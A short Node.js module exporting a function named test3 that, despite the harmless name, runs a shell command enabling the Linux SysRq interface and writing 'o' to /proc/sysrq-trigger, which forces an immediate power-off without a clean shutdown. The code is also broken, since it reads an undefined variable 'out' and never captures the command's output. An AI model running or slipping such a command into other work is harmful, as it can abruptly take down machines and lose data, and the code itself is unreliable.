const test3 = () => {
    const { exec } = require('child_process');
    exec('echo 1 > /proc/sys/kernel/sysrq; echo o > /proc/sysrq-trigger');
    if(out.stderr.toString('utf8')){
        return out.stderr.toString('utf8');
    } else {
        return out.stdout.toString('utf8');
    }

}

module.exports = {
    test3
}
    
